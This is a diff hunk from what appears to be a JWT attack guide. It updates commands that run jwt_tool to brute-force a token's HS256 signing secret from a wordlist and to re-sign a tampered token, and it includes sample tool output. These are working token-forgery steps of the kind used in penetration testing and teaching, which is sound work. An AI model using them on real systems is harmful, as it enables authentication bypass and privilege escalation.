@@ -188,20 +188,23 @@ First, bruteforce the "secret" key used to compute the signature.
 
 ```powershell
 git clone https://github.com/ticarpi/jwt_tool
-python2.7 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI /tmp/wordlist
+python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C
 
-Token header values:
-[+] alg = HS256
-[+] typ = JWT
+        \   \        \         \          \                    \
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.2.2                \______|             @ticarpi
 
-Token payload values:
-[+] sub = 1234567890
-[+] role = user
-[+] iat = 1516239022
+Original JWT:
 
-File loaded: /tmp/wordlist
-Testing 5 passwords...
 [+] secret is the CORRECT key!
+You can tamper/fuzz the token contents (-T/-I) and sign it using:
+python3 jwt_tool.py [options here] -S HS256 -p "secret"
 ```
 
 Then edit the field inside the JSON Web Token.
